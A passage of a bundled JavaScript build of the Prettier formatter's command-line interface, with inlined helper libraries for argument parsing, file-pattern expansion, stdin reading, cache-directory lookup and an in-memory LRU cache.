// node_modules/sdbm/index.js
function sdbm(string) {
  let hash2 = 0;
  for (let i = 0; i < string.length; i++) {
    hash2 = string.charCodeAt(i) + (hash2 << 6) + (hash2 << 16) - hash2;
  }
  return hash2 >>> 0;
}

// src/cli/utils.js
import { __internal as sharedWithCli2 } from "../index.mjs";
var printToScreen = console.log.bind(console);
function groupBy(array, iteratee) {
  const result = /* @__PURE__ */ Object.create(null);
  for (const value of array) {
    const key = iteratee(value);
    if (Array.isArray(result[key])) {
      result[key].push(value);
    } else {
      result[key] = [value];
    }
  }
  return result;
}
function pick(object2, keys2) {
  const entries = keys2.map((key) => [key, object2[key]]);
  return Object.fromEntries(entries);
}
function createHash(source) {
  return String(sdbm(source));
}
async function statSafe(filePath) {
  try {
    return await fs.stat(filePath);
  } catch (error) {
    if (error.code !== "ENOENT") {
      throw error;
    }
  }
}
async function lstatSafe(filePath) {
  try {
    return await fs.lstat(filePath);
  } catch (error) {
    if (error.code !== "ENOENT") {
      throw error;
    }
  }
}
function isJson(value) {
  try {
    JSON.parse(value);
    return true;
  } catch {
    return false;
  }
}
var normalizeToPosix = path.sep === "\\" ? (filepath) => string_replace_all_default(
  /* isOptionalObject */
  false,
  filepath,
  "\\",
  "/"
) : (filepath) => filepath;
var { omit } = sharedWithCli2.utils;

// src/cli/options/create-minimist-options.js
function createMinimistOptions(detailedOptions) {
  const booleanNames = [];
  const stringNames = [];
  const defaultValues = {};
  for (const option of detailedOptions) {
    const { name, alias, type } = option;
    const names = type === "boolean" ? booleanNames : stringNames;
    names.push(name);
    if (alias) {
      names.push(alias);
    }
    if (!option.deprecated && (!option.forwardToApi || name === "plugin") && option.default !== void 0) {
      defaultValues[option.name] = option.default;
    }
  }
  return {
    // we use vnopts' AliasSchema to handle aliases for better error messages
    alias: {},
    boolean: booleanNames,
    string: stringNames,
    default: defaultValues
  };
}

// src/cli/options/minimist.js
var import_minimist = __toESM(require_minimist(), 1);
var PLACEHOLDER = null;
function minimistParse(args, options) {
  const boolean = options.boolean ?? [];
  const defaults = options.default ?? {};
  const booleanWithoutDefault = boolean.filter((key) => !(key in defaults));
  const newDefaults = {
    ...defaults,
    ...Object.fromEntries(
      booleanWithoutDefault.map((key) => [key, PLACEHOLDER])
    )
  };
  const parsed = (0, import_minimist.default)(args, { ...options, default: newDefaults });
  return Object.fromEntries(
    Object.entries(parsed).filter(([, value]) => value !== PLACEHOLDER)
  );
}

// src/cli/options/normalize-cli-options.js
var descriptor = {
  key: (key) => key.length === 1 ? `-${key}` : `--${key}`,
  value: (value) => vnopts.apiDescriptor.value(value),
  pair: ({ key, value }) => value === false ? `--no-${key}` : value === true ? descriptor.key(key) : value === "" ? `${descriptor.key(key)} without an argument` : `${descriptor.key(key)}=${value}`
};
var FlagSchema = class extends vnopts.ChoiceSchema {
  #flags = [];
  constructor({ name, flags }) {
    super({ name, choices: flags });
    this.#flags = [...flags].sort();
  }
  preprocess(value, utils) {
    if (typeof value === "string" && value.length > 0 && !this.#flags.includes(value)) {
      const suggestion = this.#flags.find((flag) => leven(flag, value) < 3);
      if (suggestion) {
        utils.logger.warn(
          [
            `Unknown flag ${picocolors.yellow(utils.descriptor.value(value))},`,
            `did you mean ${picocolors.blue(utils.descriptor.value(suggestion))}?`
          ].join(" ")
        );
        return suggestion;
      }
    }
    return value;
  }
  expected() {
    return "a flag";
  }
};
function normalizeCliOptions(options, optionInfos, opts) {
  return normalizeOptions(options, optionInfos, {
    ...opts,
    isCLI: true,
    FlagSchema,
    descriptor
  });
}
var normalize_cli_options_default = normalizeCliOptions;

// src/cli/options/parse-cli-arguments.js
function parseArgv(rawArguments, detailedOptions, logger, keys2) {
  const minimistOptions = createMinimistOptions(detailedOptions);
  let argv2 = minimistParse(rawArguments, minimistOptions);
  if (keys2) {
    detailedOptions = detailedOptions.filter(
      (option) => keys2.includes(option.name)
    );
    argv2 = pick(argv2, keys2);
  }
  const normalized = normalize_cli_options_default(argv2, detailedOptions, { logger });
  return {
    ...Object.fromEntries(
      Object.entries(normalized).map(([key, value]) => {
        const option = detailedOptions.find(({ name }) => name === key) || {};
        return [option.forwardToApi || camelCase(key), value];
      })
    ),
    _: normalized._?.map(String),
    get __raw() {
      return argv2;
    }
  };
}
var { detailedOptions: detailedOptionsWithoutPlugins } = getContextOptionsWithoutPlugins();
function parseArgvWithoutPlugins(rawArguments, logger, keys2) {
  return parseArgv(
    rawArguments,
    detailedOptionsWithoutPlugins,
    logger,
    typeof keys2 === "string" ? [keys2] : keys2
  );
}

// src/cli/context.js
var Context = class {
  #stack = [];
  constructor({ rawArguments, logger }) {
    this.rawArguments = rawArguments;
    this.logger = logger;
  }
  async init() {
    const { rawArguments, logger } = this;
    const { plugins } = parseArgvWithoutPlugins(rawArguments, logger, [
      "plugin"
    ]);
    await this.pushContextPlugins(plugins);
    const argv2 = parseArgv(rawArguments, this.detailedOptions, logger);
    this.argv = argv2;
    this.filePatterns = argv2._;
  }
  /**
   * @param {string[]} plugins
   */
  async pushContextPlugins(plugins) {
    const options = await getContextOptions(plugins);
    this.#stack.push(options);
    Object.assign(this, options);
  }
  popContextPlugins() {
    this.#stack.pop();
    Object.assign(this, at_default(
      /* isOptionalObject */
      false,
      this.#stack,
      -1
    ));
  }
  // eslint-disable-next-line getter-return
  get performanceTestFlag() {
    const { debugBenchmark, debugRepeat } = this.argv;
    if (debugBenchmark) {
      return {
        name: "--debug-benchmark",
        debugBenchmark: true
      };
    }
    if (debugRepeat > 0) {
      return {
        name: "--debug-repeat",
        debugRepeat
      };
    }
    const { PRETTIER_PERF_REPEAT } = process.env;
    if (PRETTIER_PERF_REPEAT && /^\d+$/u.test(PRETTIER_PERF_REPEAT)) {
      return {
        name: "PRETTIER_PERF_REPEAT (environment variable)",
        debugRepeat: Number(PRETTIER_PERF_REPEAT)
      };
    }
  }
};
var context_default = Context;

// src/cli/file-info.js
var import_fast_json_stable_stringify = __toESM(require_fast_json_stable_stringify(), 1);
import path2 from "path";
import { format, getFileInfo } from "../index.mjs";
async function logFileInfoOrDie(context) {
  const {
    fileInfo: file,
    ignorePath,
    withNodeModules: withNodeModules2,
    plugins,
    config
  } = context.argv;
  const fileInfo = await getFileInfo(path2.resolve(file), {
    ignorePath,
    withNodeModules: withNodeModules2,
    plugins: plugins.length > 0 ? plugins : void 0,
    resolveConfig: config !== false
  });
  const result = await format((0, import_fast_json_stable_stringify.default)(fileInfo), { parser: "json" });
  printToScreen(result.trim());
}
var file_info_default = logFileInfoOrDie;

// src/cli/find-config-path.js
import path3 from "path";
import { resolveConfigFile } from "../index.mjs";
async function logResolvedConfigPathOrDie(context) {
  const file = context.argv.findConfigPath;
  const configFile = await resolveConfigFile(file);
  if (configFile) {
    printToScreen(normalizeToPosix(path3.relative(process.cwd(), configFile)));
  } else {
    throw new Error(`Can not find configure file for "${file}".`);
  }
}
var find_config_path_default = logResolvedConfigPathOrDie;

// src/cli/format.js
import fs9 from "fs/promises";
import path12 from "path";

// node_modules/get-stdin/index.js
var { stdin } = process;
async function getStdin() {
  let result = "";
  if (stdin.isTTY) {
    return result;
  }
  stdin.setEncoding("utf8");
  for await (const chunk of stdin) {
    result += chunk;
  }
  return result;
}
getStdin.buffer = async () => {
  const result = [];
  let length = 0;
  if (stdin.isTTY) {
    return Buffer.concat([]);
  }
  for await (const chunk of stdin) {
    result.push(chunk);
    length += chunk.length;
  }
  return Buffer.concat(result, length);
};

// src/cli/format.js
import * as prettier from "../index.mjs";

// src/cli/expand-patterns.js
import path5 from "path";

// src/cli/directory-ignorer.js
import path4 from "path";
var alwaysIgnoredDirectories = [".git", ".sl", ".svn", ".hg", ".jj"];
var withNodeModules = [...alwaysIgnoredDirectories, "node_modules"];
var cwd = process.cwd();
var DirectoryIgnorer = class {
  #directories;
  ignorePatterns;
  constructor(shouldIgnoreNodeModules) {
    const directories = shouldIgnoreNodeModules ? withNodeModules : alwaysIgnoredDirectories;
    const patterns = directories.map((directory) => `**/${directory}`);
    this.#directories = new Set(directories);
    this.ignorePatterns = patterns;
  }
  /**
   * @param {string} absolutePathOrPattern
   */
  shouldIgnore(absolutePathOrPattern) {
    const directoryNames = path4.relative(cwd, absolutePathOrPattern).split(path4.sep);
    return directoryNames.some(
      (directoryName) => this.#directories.has(directoryName)
    );
  }
};
var directoryIgnorerWithNodeModules = new DirectoryIgnorer(
  /* shouldIgnoreNodeModules */
  true
);
var directoryIgnorerWithoutNodeModules = new DirectoryIgnorer(
  /* shouldIgnoreNodeModules */
  false
);

// src/cli/expand-patterns.js
async function* expandPatterns(context) {
  const seen = /* @__PURE__ */ new Set();
  let noResults = true;
  for await (const { filePath, ignoreUnknown, error } of expandPatternsInternal(
    context
  )) {
    noResults = false;
    if (error) {
      yield { error };
      continue;
    }
    const filename = path5.resolve(filePath);
    if (seen.has(filename)) {
      continue;
    }
    seen.add(filename);
    yield { filename, ignoreUnknown };
  }
  if (noResults && context.argv.errorOnUnmatchedPattern !== false) {
    yield {
      error: `No matching files. Patterns: ${context.filePatterns.join(" ")}`
    };
  }
}
async function* expandPatternsInternal(context) {
  const directoryIgnorer = context.argv.withNodeModules === true ? directoryIgnorerWithoutNodeModules : directoryIgnorerWithNodeModules;
  const globOptions = {
    dot: true,
    ignore: [...directoryIgnorer.ignorePatterns],
    followSymbolicLinks: false
  };
  const cwd3 = process.cwd();
  const entries = [];
  for (const pattern of context.filePatterns) {
    const absolutePath = path5.resolve(pattern);
    if (directoryIgnorer.shouldIgnore(absolutePath)) {
      continue;
    }
    const stat = await lstatSafe(absolutePath);
    if (stat) {
      if (stat.isSymbolicLink()) {
        if (context.argv.errorOnUnmatchedPattern !== false) {
          yield {
            error: `Explicitly specified pattern "${pattern}" is a symbolic link.`
          };
        } else {
          context.logger.debug(
            `Skipping pattern "${pattern}", as it is a symbolic link.`
          );
        }
      } else if (stat.isFile()) {
        entries.push({
          type: "file",
          glob: escapePathForGlob(fixWindowsSlashes(pattern)),
          input: pattern
        });
      } else if (stat.isDirectory()) {
        const relativePath = path5.relative(cwd3, absolutePath) || ".";
        const prefix = escapePathForGlob(fixWindowsSlashes(relativePath));
        entries.push({
          type: "dir",
          glob: `${prefix}/**/*`,
          input: pattern,
          ignoreUnknown: true
        });
      }
    } else if (pattern[0] === "!") {
      globOptions.ignore.push(fixWindowsSlashes(pattern.slice(1)));
    } else {
      entries.push({
        type: "glob",
        glob: fixWindowsSlashes(pattern),
        input: pattern
      });
    }
  }
  for (const { type, glob, input, ignoreUnknown } of entries) {
    let result;
    try {
      result = await fastGlob(glob, globOptions);
    } catch ({ message }) {
      yield {
        error: `${errorMessages.globError[type]}: "${input}".
${message}`
      };
      continue;
    }
    if (result.length === 0) {
      if (context.argv.errorOnUnmatchedPattern !== false) {
        yield { error: `${errorMessages.emptyResults[type]}: "${input}".` };
      }
    } else {
      yield* sortPaths(result).map((filePath) => ({ filePath, ignoreUnknown }));
    }
  }
}
var errorMessages = {
  globError: {
    file: "Unable to resolve file",
    dir: "Unable to expand directory",
    glob: "Unable to expand glob pattern"
  },
  emptyResults: {
    file: "Explicitly specified file was ignored due to negative glob patterns",
    dir: "No supported files were found in the directory",
    glob: "No files matching the pattern were found"
  }
};
function sortPaths(paths) {
  return paths.sort((a, b) => a.localeCompare(b));
}
function escapePathForGlob(path13) {
  return string_replace_all_default(
    /* isOptionalObject */
    false,
    string_replace_all_default(
      /* isOptionalObject */
      false,
      fastGlob.escapePath(
        string_replace_all_default(
          /* isOptionalObject */
          false,
          path13,
          "\\",
          "\0"
        )
        // Workaround for fast-glob#262 (part 1)
      ),
      String.raw`\!`,
      "@(!)"
    ),
    "\0",
    String.raw`@(\\)`
  );
}
var fixWindowsSlashes = normalizeToPosix;

// src/cli/find-cache-file.js
import fs4 from "fs/promises";
import os from "os";
import path9 from "path";

// node_modules/find-cache-directory/index.js
var import_common_path_prefix = __toESM(require_common_path_prefix(), 1);
import process3 from "process";
import path8 from "path";
import fs3 from "fs";

// node_modules/pkg-dir/index.js
import path7 from "path";

// node_modules/find-up-simple/index.js
import process2 from "process";
import { fileURLToPath } from "url";
import fs2 from "fs";
import path6 from "path";
var toPath = (urlOrPath) => urlOrPath instanceof URL ? fileURLToPath(urlOrPath) : urlOrPath;
function findUpSync(name, {
  cwd: cwd3 = process2.cwd(),
  type = "file",
  stopAt
} = {}) {
  let directory = path6.resolve(toPath(cwd3) ?? "");
  const { root } = path6.parse(directory);
  stopAt = path6.resolve(directory, toPath(stopAt) ?? root);
  const isAbsoluteName = path6.isAbsolute(name);
  while (directory) {
    const filePath = isAbsoluteName ? name : path6.join(directory, name);
    try {
      const stats = fs2.statSync(filePath, { throwIfNoEntry: false });
      if (type === "file" && stats?.isFile() || type === "directory" && stats?.isDirectory()) {
        return filePath;
      }
    } catch {
    }
    if (directory === stopAt || directory === root) {
      break;
    }
    directory = path6.dirname(directory);
  }
}

// node_modules/pkg-dir/index.js
function packageDirectorySync({ cwd: cwd3 } = {}) {
  const filePath = findUpSync("package.json", { cwd: cwd3 });
  return filePath && path7.dirname(filePath);
}

// node_modules/find-cache-directory/index.js
var { env, cwd: cwd2 } = process3;
var isWritable = (path13) => {
  try {
    fs3.accessSync(path13, fs3.constants.W_OK);
    return true;
  } catch {
    return false;
  }
};
function useDirectory(directory, options) {
  if (options.create) {
    fs3.mkdirSync(directory, { recursive: true });
  }
  return directory;
}
function getNodeModuleDirectory(directory) {
  const nodeModules = path8.join(directory, "node_modules");
  if (!isWritable(nodeModules) && (fs3.existsSync(nodeModules) || !isWritable(path8.join(directory)))) {
    return;
  }
  return nodeModules;
}
function findCacheDirectory(options = {}) {
  if (env.CACHE_DIR && !["true", "false", "1", "0"].includes(env.CACHE_DIR)) {
    return useDirectory(path8.join(env.CACHE_DIR, options.name), options);
  }
  let { cwd: directory = cwd2(), files } = options;
  if (files) {
    if (!Array.isArray(files)) {
      throw new TypeError(`Expected \`files\` option to be an array, got \`${typeof files}\`.`);
    }
    directory = (0, import_common_path_prefix.default)(files.map((file) => path8.resolve(directory, file)));
  }
  directory = packageDirectorySync({ cwd: directory });
  if (!directory) {
    return;
  }
  const nodeModules = getNodeModuleDirectory(directory);
  if (!nodeModules) {
    return;
  }
  return useDirectory(path8.join(directory, "node_modules", ".cache", options.name), options);
}

// src/cli/find-cache-file.js
function findDefaultCacheFile() {
  const cacheDir = findCacheDirectory({ name: "prettier", create: true }) || os.tmpdir();
  const cacheFilePath = path9.join(cacheDir, ".prettier-cache");
  return cacheFilePath;
}
async function findCacheFileFromOption(cacheLocation) {
  const cacheFile = path9.resolve(cacheLocation);
  const stat = await statSafe(cacheFile);
  if (stat) {
    if (stat.isDirectory()) {
      throw new Error(
        `Resolved --cache-location '${cacheFile}' is a directory`
      );
    }
    const data = await fs4.readFile(cacheFile, "utf8");
    if (!isJson(data)) {
      throw new Error(`'${cacheFile}' isn't a valid JSON file`);
    }
  }
  return cacheFile;
}
async function findCacheFile(cacheLocation) {
  if (!cacheLocation) {
    return findDefaultCacheFile();
  }
  const cacheFile = await findCacheFileFromOption(cacheLocation);
  return cacheFile;
}
var find_cache_file_default = findCacheFile;

// src/cli/format-results-cache.js
var import_fast_json_stable_stringify2 = __toESM(require_fast_json_stable_stringify(), 1);
import fs7 from "fs";

// node_modules/file-entry-cache/dist/index.js
import crypto2 from "crypto";
import fs6 from "fs";
import path11 from "path";

// node_modules/flat-cache/dist/index.js
import fs5 from "fs";
import path10 from "path";

// node_modules/hookified/dist/node/index.js
var o = class {
  _eventListeners;
  _maxListeners;
  _logger;
  _throwOnEmitError = false;
  constructor(e) {
    this._eventListeners = /* @__PURE__ */ new Map(), this._maxListeners = 100, this._logger = e?.logger, e?.throwOnEmitError !== void 0 && (this._throwOnEmitError = e.throwOnEmitError);
  }
  get logger() {
    return this._logger;
  }
  set logger(e) {
    this._logger = e;
  }
  get throwOnEmitError() {
    return this._throwOnEmitError;
  }
  set throwOnEmitError(e) {
    this._throwOnEmitError = e;
  }
  once(e, t) {
    let r = (...s) => {
      this.off(e, r), t(...s);
    };
    return this.on(e, r), this;
  }
  listenerCount(e) {
    if (e === void 0) return this.getAllListeners().length;
    let t = this._eventListeners.get(e);
    return t ? t.length : 0;
  }
  eventNames() {
    return [...this._eventListeners.keys()];
  }
  rawListeners(e) {
    return e === void 0 ? this.getAllListeners() : this._eventListeners.get(e) ?? [];
  }
  prependListener(e, t) {
    let r = this._eventListeners.get(e) ?? [];
    return r.unshift(t), this._eventListeners.set(e, r), this;
  }
  prependOnceListener(e, t) {
    let r = (...s) => {
      this.off(e, r), t(...s);
    };
    return this.prependListener(e, r), this;
  }
  maxListeners() {
    return this._maxListeners;
  }
  addListener(e, t) {
    return this.on(e, t), this;
  }
  on(e, t) {
    this._eventListeners.has(e) || this._eventListeners.set(e, []);
    let r = this._eventListeners.get(e);
    return r && (r.length >= this._maxListeners && console.warn(`MaxListenersExceededWarning: Possible event memory leak detected. ${r.length + 1} ${e} listeners added. Use setMaxListeners() to increase limit.`), r.push(t)), this;
  }
  removeListener(e, t) {
    return this.off(e, t), this;
  }
  off(e, t) {
    let r = this._eventListeners.get(e) ?? [], s = r.indexOf(t);
    return s !== -1 && r.splice(s, 1), r.length === 0 && this._eventListeners.delete(e), this;
  }
  emit(e, ...t) {
    let r = false, s = this._eventListeners.get(e);
    if (s && s.length > 0) for (let n of s) n(...t), r = true;
    if (e === "error") {
      let n = t[0] instanceof Error ? t[0] : new Error(`${t[0]}`);
      if (this._throwOnEmitError && !r) throw n;
    }
    return r;
  }
  listeners(e) {
    return this._eventListeners.get(e) ?? [];
  }
  removeAllListeners(e) {
    return e !== void 0 ? this._eventListeners.delete(e) : this._eventListeners.clear(), this;
  }
  setMaxListeners(e) {
    this._maxListeners = e;
    for (let t of this._eventListeners.values()) t.length > e && t.splice(e);
  }
  getAllListeners() {
    let e = [];
    for (let t of this._eventListeners.values()) e = [...e, ...t];
    return e;
  }
};
var l = class extends o {
  _hooks;
  _throwHookErrors = false;
  constructor(e) {
    super({ logger: e?.logger }), this._hooks = /* @__PURE__ */ new Map(), e?.throwHookErrors !== void 0 && (this._throwHookErrors = e.throwHookErrors);
  }
  get hooks() {
    return this._hooks;
  }
  get throwHookErrors() {
    return this._throwHookErrors;
  }
  set throwHookErrors(e) {
    this._throwHookErrors = e;
  }
  onHook(e, t) {
    let r = this._hooks.get(e);
    r ? r.push(t) : this._hooks.set(e, [t]);
  }
  onHookEntry(e) {
    this.onHook(e.event, e.handler);
  }
  addHook(e, t) {
    this.onHook(e, t);
  }
  onHooks(e) {
    for (let t of e) this.onHook(t.event, t.handler);
  }
  prependHook(e, t) {
    let r = this._hooks.get(e);
    r ? r.unshift(t) : this._hooks.set(e, [t]);
  }
  prependOnceHook(e, t) {
    let r = async (...s) => (this.removeHook(e, r), t(...s));
    this.prependHook(e, r);
  }
  onceHook(e, t) {
    let r = async (...s) => (this.removeHook(e, r), t(...s));
    this.onHook(e, r);
  }
  removeHook(e, t) {
    let r = this._hooks.get(e);
    if (r) {
      let s = r.indexOf(t);
      s !== -1 && r.splice(s, 1);
    }
  }
  removeHooks(e) {
    for (let t of e) this.removeHook(t.event, t.handler);
  }
  async hook(e, ...t) {
    let r = this._hooks.get(e);
    if (r) for (let s of r) try {
      await s(...t);
    } catch (n) {
      let i = `${e}: ${n.message}`;
      if (this.emit("error", new Error(i)), this.logger && this.logger.error(i), this._throwHookErrors) throw new Error(i);
    }
  }
  async beforeHook(e, ...t) {
    await this.hook(`before:${e}`, ...t);
  }
  async afterHook(e, ...t) {
    await this.hook(`after:${e}`, ...t);
  }
  async callHook(e, ...t) {
    await this.hook(e, ...t);
  }
  getHooks(e) {
    return this._hooks.get(e);
  }
  clearHooks() {
    this._hooks.clear();
  }
};

// node_modules/cacheable/dist/index.js
import * as crypto from "crypto";
var structuredClone = globalThis.structuredClone ?? ((value) => JSON.parse(JSON.stringify(value)));
function hash(object2, algorithm = "sha256") {
  const objectString = JSON.stringify(object2);
  if (!crypto.getHashes().includes(algorithm)) {
    throw new Error(`Unsupported hash algorithm: '${algorithm}'`);
  }
  const hasher = crypto.createHash(algorithm);
  hasher.update(objectString);
  return hasher.digest("hex");
}
function hashToNumber(object2, min = 0, max = 10, algorithm = "sha256") {
  const objectString = JSON.stringify(object2);
  if (!crypto.getHashes().includes(algorithm)) {
    throw new Error(`Unsupported hash algorithm: '${algorithm}'`);
  }
  const hasher = crypto.createHash(algorithm);
  hasher.update(objectString);
  const hashHex = hasher.digest("hex");
  const hashNumber = Number.parseInt(hashHex, 16);
  const range = max - min + 1;
  return min + hashNumber % range;
}
function djb2Hash(string_, min = 0, max = 10) {
  let hash2 = 5381;
  for (let i = 0; i < string_.length; i++) {
    hash2 = hash2 * 33 ^ string_.charCodeAt(i);
  }
  const range = max - min + 1;
  return min + Math.abs(hash2) % range;
}
var ListNode = class {
  value;
  prev = void 0;
  next = void 0;
  constructor(value) {
    this.value = value;
  }
};
var DoublyLinkedList = class {
  head = void 0;
  tail = void 0;
  nodesMap = /* @__PURE__ */ new Map();
  // Add a new node to the front (most recently used)
  addToFront(value) {
    const newNode = new ListNode(value);
    if (this.head) {
      newNode.next = this.head;
      this.head.prev = newNode;
      this.head = newNode;
    } else {
      this.head = this.tail = newNode;
    }
    this.nodesMap.set(value, newNode);
  }
  // Move an existing node to the front (most recently used)
  moveToFront(value) {
    const node = this.nodesMap.get(value);
    if (!node || this.head === node) {
      return;
    }
    if (node.prev) {
      node.prev.next = node.next;
    }
    if (node.next) {
      node.next.prev = node.prev;
    }
    if (node === this.tail) {
      this.tail = node.prev;
    }
    node.prev = void 0;
    node.next = this.head;
    if (this.head) {
      this.head.prev = node;
    }
    this.head = node;
    this.tail ??= node;
  }
  // Get the oldest node (tail)
  getOldest() {
    return this.tail ? this.tail.value : void 0;
  }
  // Remove the oldest node (tail)
  removeOldest() {
    if (!this.tail) {
      return void 0;
    }
    const oldValue = this.tail.value;
    if (this.tail.prev) {
      this.tail = this.tail.prev;
      this.tail.next = void 0;
    } else {
      this.head = this.tail = void 0;
    }
    this.nodesMap.delete(oldValue);
    return oldValue;
  }
  get size() {
    return this.nodesMap.size;
  }
};
var shorthandToMilliseconds = (shorthand) => {
  let milliseconds;
  if (shorthand === void 0) {
    return void 0;
  }
  if (typeof shorthand === "number") {
    milliseconds = shorthand;
  } else if (typeof shorthand === "string") {
    shorthand = shorthand.trim();
    if (Number.isNaN(Number(shorthand))) {
      const match = /^([\d.]+)\s*(ms|s|m|h|hr|d)$/i.exec(shorthand);
      if (!match) {
        throw new Error(
          `Unsupported time format: "${shorthand}". Use 'ms', 's', 'm', 'h', 'hr', or 'd'.`
        );
      }
      const [, value, unit] = match;
      const numericValue = Number.parseFloat(value);
      const unitLower = unit.toLowerCase();
      switch (unitLower) {
        case "ms": {
          milliseconds = numericValue;
          break;
        }
        case "s": {
          milliseconds = numericValue * 1e3;
          break;
        }
        case "m": {
          milliseconds = numericValue * 1e3 * 60;
          break;
        }
        case "h": {
          milliseconds = numericValue * 1e3 * 60 * 60;
          break;
        }
        case "hr": {
          milliseconds = numericValue * 1e3 * 60 * 60;
          break;
        }
        case "d": {
          milliseconds = numericValue * 1e3 * 60 * 60 * 24;
          break;
        }
        /* c8 ignore next 3 */
        default: {
          milliseconds = Number(shorthand);
        }
      }
    } else {
      milliseconds = Number(shorthand);
    }
  } else {
    throw new TypeError("Time must be a string or a number.");
  }
  return milliseconds;
};
var shorthandToTime = (shorthand, fromDate) => {
  fromDate ??= /* @__PURE__ */ new Date();
  const milliseconds = shorthandToMilliseconds(shorthand);
  if (milliseconds === void 0) {
    return fromDate.getTime();
  }
  return fromDate.getTime() + milliseconds;
};
function wrapSync(function_, options) {
  const { ttl, keyPrefix, cache } = options;
  return (...arguments_) => {
    let cacheKey = createWrapKey(function_, arguments_, keyPrefix);
    if (options.createKey) {
      cacheKey = options.createKey(function_, arguments_, options);
    }
    let value = cache.get(cacheKey);
    if (value === void 0) {
      try {
        value = function_(...arguments_);
        cache.set(cacheKey, value, ttl);
      } catch (error) {
        cache.emit("error", error);
        if (options.cacheErrors) {
          cache.set(cacheKey, error, ttl);
        }
      }
    }
    return value;
  };
}
function createWrapKey(function_, arguments_, keyPrefix) {
  if (!keyPrefix) {
    return `${function_.name}::${hash(arguments_)}`;
  }
  return `${keyPrefix}::${function_.name}::${hash(arguments_)}`;
}
var defaultStoreHashSize = 16;
var maximumMapSize = 16777216;
var CacheableMemory = class extends l {
  _lru = new DoublyLinkedList();
  _storeHashSize = defaultStoreHashSize;
  _storeHashAlgorithm = "djb2Hash";
  // Default is djb2Hash
  _store = Array.from(
    { length: this._storeHashSize },
    () => /* @__PURE__ */ new Map()
  );
  _ttl;
  // Turned off by default
  _useClone = true;
  // Turned on by default
  _lruSize = 0;
  // Turned off by default
  _checkInterval = 0;
  // Turned off by default
  _interval = 0;
  // Turned off by default
  /**
   * @constructor
   * @param {CacheableMemoryOptions} [options] - The options for the CacheableMemory
   */
  constructor(options) {
    super();
    if (options?.ttl) {
      this.setTtl(options.ttl);
    }
    if (options?.useClone !== void 0) {
      this._useClone = options.useClone;
    }
    if (options?.storeHashSize && options.storeHashSize > 0) {
      this._storeHashSize = options.storeHashSize;
    }
    if (options?.lruSize) {
      if (options.lruSize > maximumMapSize) {
        this.emit(
          "error",
          new Error(
            `LRU size cannot be larger than ${maximumMapSize} due to Map limitations.`
          )
        );
      } else {
        this._lruSize = options.lruSize;
      }
    }
    if (options?.checkInterval) {
      this._checkInterval = options.checkInterval;
    }
    if (options?.storeHashAlgorithm) {
      this._storeHashAlgorithm = options.storeHashAlgorithm;
    }
    this._store = Array.from(
      { length: this._storeHashSize },
      () => /* @__PURE__ */ new Map()
    );
    this.startIntervalCheck();
  }
  /**
   * Gets the time-to-live
   * @returns {number|string|undefined} - The time-to-live in miliseconds or a human-readable format. If undefined, it will not have a time-to-live.
   */
  get ttl() {
    return this._ttl;
  }
  /**
   * Sets the time-to-live
   * @param {number|string|undefined} value - The time-to-live in miliseconds or a human-readable format (example '1s' = 1 second, '1h' = 1 hour). If undefined, it will not have a time-to-live.
   */
  set ttl(value) {
    this.setTtl(value);
  }
  /**
   * Gets whether to use clone
   * @returns {boolean} - If true, it will clone the value before returning it. If false, it will return the value directly. Default is true.
   */
  get useClone() {
    return this._useClone;
  }
  /**
   * Sets whether to use clone
   * @param {boolean} value - If true, it will clone the value before returning it. If false, it will return the value directly. Default is true.
   */
  set useClone(value) {
    this._useClone = value;
  }
  /**
   * Gets the size of the LRU cache
   * @returns {number} - The size of the LRU cache. If set to 0, it will not use LRU cache. Default is 0. If you are using LRU then the limit is based on Map() size 17mm.
   */
  get lruSize() {
    return this._lruSize;
  }
  /**
   * Sets the size of the LRU cache
   * @param {number} value - The size of the LRU cache. If set to 0, it will not use LRU cache. Default is 0. If you are using LRU then the limit is based on Map() size 17mm.
   */
  set lruSize(value) {
    if (value > maximumMapSize) {
      this.emit(
        "error",
        new Error(
          `LRU size cannot be larger than ${maximumMapSize} due to Map limitations.`
        )
      );
      return;
    }
    this._lruSize = value;
    if (this._lruSize === 0) {
      this._lru = new DoublyLinkedList();
      return;
    }
    this.lruResize();
  }
  /**
   * Gets the check interval
   * @returns {number} - The interval to check for expired items. If set to 0, it will not check for expired items. Default is 0.
   */
  get checkInterval() {
    return this._checkInterval;
  }
  /**
   * Sets the check interval
   * @param {number} value - The interval to check for expired items. If set to 0, it will not check for expired items. Default is 0.
   */
  set checkInterval(value) {
    this._checkInterval = value;
  }
  /**
   * Gets the size of the cache
   * @returns {number} - The size of the cache
   */
  get size() {
    let size = 0;
    for (const store of this._store) {
      size += store.size;
    }
    return size;
  }
  /**
   * Gets the number of hash stores
   * @returns {number} - The number of hash stores
   */
  get storeHashSize() {
    return this._storeHashSize;
  }
  /**
   * Sets the number of hash stores. This will recreate the store and all data will be cleared
   * @param {number} value - The number of hash stores
   */
  set storeHashSize(value) {
    if (value === this._storeHashSize) {
      return;
    }
    this._storeHashSize = value;
    this._store = Array.from(
      { length: this._storeHashSize },
      () => /* @__PURE__ */ new Map()
    );
  }
  /**
   * Gets the store hash algorithm
   * @returns {StoreHashAlgorithm | StoreHashAlgorithmFunction} - The store hash algorithm
   */
  get storeHashAlgorithm() {
    return this._storeHashAlgorithm;
  }
  /**
   * Sets the store hash algorithm. This will recreate the store and all data will be cleared
   * @param {StoreHashAlgorithm | StoreHashAlgorithmFunction} value - The store hash algorithm
   */
  set storeHashAlgorithm(value) {
    this._storeHashAlgorithm = value;
  }
  /**
   * Gets the keys
   * @returns {IterableIterator<string>} - The keys
   */
  get keys() {
    const keys2 = [];
    for (const store of this._store) {
      for (const key of store.keys()) {
        const item = store.get(key);
        if (item && this.hasExpired(item)) {
          store.delete(key);
          continue;
        }
        keys2.push(key);
      }
    }
    return keys2.values();
  }
  /**
   * Gets the items
   * @returns {IterableIterator<CacheableStoreItem>} - The items
   */
  get items() {
    const items = [];
    for (const store of this._store) {
      for (const item of store.values()) {
        if (this.hasExpired(item)) {
          store.delete(item.key);
          continue;
        }
        items.push(item);
      }
    }
    return items.values();
  }
  /**
   * Gets the store
   * @returns {Array<Map<string, CacheableStoreItem>>} - The store
   */
  get store() {
    return this._store;
  }
  /**
   * Gets the value of the key
   * @param {string} key - The key to get the value
   * @returns {T | undefined} - The value of the key
   */
  get(key) {
    const store = this.getStore(key);
    const item = store.get(key);
    if (!item) {
      return void 0;
    }
    if (item.expires && Date.now() > item.expires) {
      store.delete(key);
      return void 0;
    }
    this.lruMoveToFront(key);
    if (!this._useClone) {
      return item.value;
    }
    return this.clone(item.value);
  }
  /**
   * Gets the values of the keys
   * @param {string[]} keys - The keys to get the values
   * @returns {T[]} - The values of the keys
